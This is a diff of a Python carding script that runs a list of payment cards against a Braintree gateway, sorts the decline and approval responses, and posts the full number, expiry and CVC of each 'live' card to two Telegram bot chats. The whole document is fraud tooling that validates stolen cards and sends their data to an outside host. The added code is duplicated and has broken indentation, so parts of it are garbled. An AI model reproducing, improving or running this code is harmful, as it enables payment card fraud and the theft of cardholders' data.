@@ -472,6 +472,101 @@ for P in file.readlines():
         ID -> {id}
         
        Uѕєя αgєит -> {user}
+if 'Do Not Honor' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2000: 𝗗σ 𝗡σт 𝗛σиσя ❌ > ')
+    	
+    elif 'Closed Card' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2108: 𝗖ℓσѕє𝗗 𝗖αя𝗗 ❌ > ')
+	
+    elif 'No Account' in response:
+	    print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2007: 𝗡σ 𝗔𝗰𝗰συит ❌ > ')
+
+    elif 'Call Issuer. Pick Up Card.' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2047: 𝗣ι𝗰к 𝗨ρ 𝗖αя𝗗 ❌ > ')
+    	
+    elif 'Transaction Not Allowed' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2015: Transaction Not Allowed ❌ > ')
+    	
+    
+    elif 'Credit card number is invalid.[Validation: number - CREDIT_CARD_NUMBER_IS_INVALID] Credit card number is invalid.' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 10: Credit card number is invalid.[Validation: number - CREDIT_CARD_NUMBER_IS_INVALID] Credit card number is invalid. ❌ > ')
+
+    
+
+    elif 'Cannot Authorize at this time (Policy)' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2106: 𝗖αииσт 𝗔υтнσяιzє 𝗔т 𝗧нιѕ 𝗧ιмє ( 𝗣σℓι𝗰у ) ❌ > ')
+
+    elif 'Expired Card' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2106: ExpireD CarD ❌ > ')
+    	
+    elif 'Processor Declined' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2038: Processor Declined ❌ > ')
+    	
+    elif 'Issuer or Cardholder has put a restriction on the card' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2057: Issuer or Cardholder has put a restriction on the card ❌ > ')
+    	
+    elif 'Gateway Rejected: risk_threshold' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 10: Issuer or Cardholder has put a restriction on the card ❌ > ')
+    	
+    elif 'Cannot Authorize at this time (Life cycle)' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2097: Cannot Authorize at this time (Life cycle) ❌ > ')
+    	
+    elif 'Declined - Call Issuer' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2044: Declined - Call Issuer ❌ > ')
+    	
+    elif 'Processor Declined - Fraud Suspected' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2014: Processor Declined - Fraud Suspected ❌ > ')
+    	
+    elif 'Invalid Merchant ID' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2026: Invalid Merchant ID ❌ > ')
+    	
+    if 'CHARGED' in response or 'avs' in response or 'postal' in response or 'approved' in response or 'Nice!' in response or 'Approved' in response or 'Duplicate' in response or 'Successful' in response or 'successful' in response or 'Thank you' in response or 'confirmed' in response or 'successfully' in response:
+        print(f'{P} >> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ < 2020: > < Everything ✅ > ')
+		
+    	
+    
+    elif "Credit card type is not accepted by this merchant account.[Validation: number - CREDIT_CARD_CREDIT_CARD_TYPE_IS_NOT_ACCEPTED] Credit card type is not accepted by this merchant account." in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 10: [Validation: number - CREDIT_CARD_CREDIT_CARD_TYPE_IS_NOT_ACCEPTED] ❌ > ')
+    	
+    elif "Insufficient Funds" in response:
+        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < Google Play ✅ > ')
+        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
+    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  Bιи -> {P[:6]} 
+    	  Gαтєωαу -> Braintree Auth
+        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        Rєѕρσиѕє -> Insufficient Funds ✅ 
+        ID -> {id}
+       Uѕєя αgєит -> {user}
+	        Tιмє -> {elapsed_time} SєcσиDѕ .  
+	        
+	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
+        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
+        requests.post(f"""https://api.telegram.org/bot{token2}/sendmessage?chat_id={id2}&text=
+    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  Bιи -> {P[:6]} 
+    	  Gαтєωαу -> Braintree Auth
+        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        Rєѕρσиѕє -> Insufficient Funds ✅ 
+        ID -> tg://openmessage?user_id={id}
+        
+       Uѕєя αgєит -> {user}
+	        Tιмє -> {elapsed_time} SєcσиDѕ .  
+	        
+	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
+        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
+        
+    elif 'Card Issuer Declined CVV' in response:
+    	print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < 2010: 𝗖𝗖𝗡 ✅ > < Just Try The Sites ✅ > ')
+    	requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
+    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  Bιи -> {P[:6]} 
+    	  Gαтєωαу -> Braintree Auth
+        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        Rєѕρσиѕє -> 𝗖𝗖𝗡 ✅ 
+        ID -> {id}
+        
+       Uѕєя αgєит -> {user}
 	        Tιмє -> {elapsed_time} SєcσиDѕ .  
 	        
 	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
@@ -480,7 +575,7 @@ for P in file.readlines():
     	  Bιи -> {P[:6]} 
     	  Gαтєωαу -> Braintree Auth
         Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
-        Rєѕρσиѕє -> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ 
+        Rєѕρσиѕє -> 𝗖𝗖𝗡 ✅ 
         ID -> tg://openmessage?user_id={id}
         
        Uѕєя αgєит -> {user}
@@ -490,7 +585,176 @@ for P in file.readlines():
         ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
         
         
-    elif 'Gateway Rejected: cvv' in response.text:
+    	
+    #elif 'Violation' in response.text:
+    	#print(f'{P} >> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ < 2020: > < Everything ✅ > ')
+    	#requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
+    	#Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  #Bιи -> {P[:6]} 
+    	  #Gαтєωαу -> Pαуfℓσω Pяσ
+        #Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        #Rєѕρσиѕє -> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ 
+        #ID -> {id}
+        
+       #Uѕєя αgєит -> {user}
+	        #Tιмє -> {elapsed_time} SєcσиDѕ .  
+	        
+	    #Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
+        #~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""");requests.post(f"""https://api.telegram.org/bot{token2}/sendmessage?chat_id={id2}&text=
+    	#Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  #Bιи -> {P[:6]} 
+    	  #Gαтєωαу -> Braintree Auth
+        #Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        #Rєѕρσиѕє -> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ 
+        #ID -> tg://openmessage?user_id={id}
+        
+       #Uѕєя αgєит -> {user}
+	        #Tιмє -> {elapsed_time} SєcσиDѕ .  
+	        
+if 'Do Not Honor' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2000: 𝗗σ 𝗡σт 𝗛σиσя ❌ > ')
+    	
+    elif 'Closed Card' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2108: 𝗖ℓσѕє𝗗 𝗖αя𝗗 ❌ > ')
+	
+    elif 'No Account' in response:
+	    print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2007: 𝗡σ 𝗔𝗰𝗰συит ❌ > ')
+
+    elif 'Call Issuer. Pick Up Card.' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2047: 𝗣ι𝗰к 𝗨ρ 𝗖αя𝗗 ❌ > ')
+    	
+    elif 'Transaction Not Allowed' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2015: Transaction Not Allowed ❌ > ')
+    	
+    
+    elif 'Credit card number is invalid.[Validation: number - CREDIT_CARD_NUMBER_IS_INVALID] Credit card number is invalid.' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 10: Credit card number is invalid.[Validation: number - CREDIT_CARD_NUMBER_IS_INVALID] Credit card number is invalid. ❌ > ')
+
+    
+
+    elif 'Cannot Authorize at this time (Policy)' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2106: 𝗖αииσт 𝗔υтнσяιzє 𝗔т 𝗧нιѕ 𝗧ιмє ( 𝗣σℓι𝗰у ) ❌ > ')
+
+    elif 'Expired Card' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2106: ExpireD CarD ❌ > ')
+    	
+    elif 'Processor Declined' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2038: Processor Declined ❌ > ')
+    	
+    elif 'Issuer or Cardholder has put a restriction on the card' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2057: Issuer or Cardholder has put a restriction on the card ❌ > ')
+    	
+    elif 'Gateway Rejected: risk_threshold' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 10: Issuer or Cardholder has put a restriction on the card ❌ > ')
+    	
+    elif 'Cannot Authorize at this time (Life cycle)' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2097: Cannot Authorize at this time (Life cycle) ❌ > ')
+    	
+    elif 'Declined - Call Issuer' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2044: Declined - Call Issuer ❌ > ')
+    	
+    elif 'Processor Declined - Fraud Suspected' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2014: Processor Declined - Fraud Suspected ❌ > ')
+    	
+    elif 'Invalid Merchant ID' in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 2026: Invalid Merchant ID ❌ > ')
+    	
+    if 'CHARGED' in response or 'avs' in response or 'postal' in response or 'approved' in response or 'Nice!' in response or 'Approved' in response or 'Duplicate' in response or 'Successful' in response or 'successful' in response or 'Thank you' in response or 'confirmed' in response or 'successfully' in response:
+        print(f'{P} >> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ < 2020: > < Everything ✅ > ')
+		
+    	
+    
+    elif "Credit card type is not accepted by this merchant account.[Validation: number - CREDIT_CARD_CREDIT_CARD_TYPE_IS_NOT_ACCEPTED] Credit card type is not accepted by this merchant account." in response:
+    	print(f'{P} >> 𝗗є𝗰ℓιиє𝗗 ❌ < 10: [Validation: number - CREDIT_CARD_CREDIT_CARD_TYPE_IS_NOT_ACCEPTED] ❌ > ')
+    	
+    elif "Insufficient Funds" in response:
+        print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < Google Play ✅ > ')
+        requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
+    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  Bιи -> {P[:6]} 
+    	  Gαтєωαу -> Braintree Auth
+        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        Rєѕρσиѕє -> Insufficient Funds ✅ 
+        ID -> {id}
+       Uѕєя αgєит -> {user}
+	        Tιмє -> {elapsed_time} SєcσиDѕ .  
+	        
+	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
+        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
+        requests.post(f"""https://api.telegram.org/bot{token2}/sendmessage?chat_id={id2}&text=
+    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  Bιи -> {P[:6]} 
+    	  Gαтєωαу -> Braintree Auth
+        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        Rєѕρσиѕє -> Insufficient Funds ✅ 
+        ID -> tg://openmessage?user_id={id}
+        
+       Uѕєя αgєит -> {user}
+	        Tιмє -> {elapsed_time} SєcσиDѕ .  
+	        
+	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
+        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
+        
+    elif 'Card Issuer Declined CVV' in response:
+    	print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < 2010: 𝗖𝗖𝗡 ✅ > < Just Try The Sites ✅ > ')
+    	requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
+    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  Bιи -> {P[:6]} 
+    	  Gαтєωαу -> Braintree Auth
+        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        Rєѕρσиѕє -> 𝗖𝗖𝗡 ✅ 
+        ID -> {id}
+        
+       Uѕєя αgєит -> {user}
+	        Tιмє -> {elapsed_time} SєcσиDѕ .  
+	        
+	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
+        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""");requests.post(f"""https://api.telegram.org/bot{token2}/sendmessage?chat_id={id2}&text=
+    	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  Bιи -> {P[:6]} 
+    	  Gαтєωαу -> Braintree Auth
+        Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        Rєѕρσиѕє -> 𝗖𝗖𝗡 ✅ 
+        ID -> tg://openmessage?user_id={id}
+        
+       Uѕєя αgєит -> {user}
+	        Tιмє -> {elapsed_time} SєcσиDѕ .  
+	        
+	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
+        ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
+        
+        
+    	
+    #elif 'Violation' in response.text:
+    	#print(f'{P} >> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ < 2020: > < Everything ✅ > ')
+    	#requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
+    	#Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  #Bιи -> {P[:6]} 
+    	  #Gαтєωαу -> Pαуfℓσω Pяσ
+        #Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        #Rєѕρσиѕє -> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ 
+        #ID -> {id}
+        
+       #Uѕєя αgєит -> {user}
+	        #Tιмє -> {elapsed_time} SєcσиDѕ .  
+	        
+	    #Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
+        #~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""");requests.post(f"""https://api.telegram.org/bot{token2}/sendmessage?chat_id={id2}&text=
+    	#Cαя∂ -> {n}|{mm}|{yy}|{cvc}
+    	  #Bιи -> {P[:6]} 
+    	  #Gαтєωαу -> Braintree Auth
+        #Rєѕυℓт -> 𝗔ρρяσνє𝗗 ✅
+        #Rєѕρσиѕє -> 𝗖𝗛𝗔𝗥𝗚𝗘 ✅ 
+        #ID -> tg://openmessage?user_id={id}
+        
+       #Uѕєя αgєит -> {user}
+	        #Tιмє -> {elapsed_time} SєcσиDѕ .  
+	        
+	    #Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
+        #~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
+        
+        
+    elif 'Gateway Rejected: cvv' in response:
         print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < cvv ✅ > < Google Play ✅ > ')
         requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
     	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
@@ -519,7 +783,7 @@ for P in file.readlines():
 	    Pяσχу -> [ ℓινє [1XX.XX.XX 🟢] ]
         ~ Pяσɢяαммεя : @B_6_Q | Cнαиияℓ : @ModcaTheLost ~""")
         
-    elif 'CVV must be 4 digits for American Express and 3 digits for other card types.' in response.text:
+    elif 'CVV must be 4 digits for American Express and 3 digits for other card types.' in response:
         print(f'{P} >> 𝗔ρρяσνє𝗗 ✅ < ✅ > < ترويج انستاغرام  ✅ > ')
         requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text=
     	Cαя∂ -> {n}|{mm}|{yy}|{cvc}
@@ -551,5 +815,5 @@ for P in file.readlines():
         
 
     else:
-    	print(response.json())
+    	print('{X} New RespoNsE ✨ ')
     time.sleep(25)
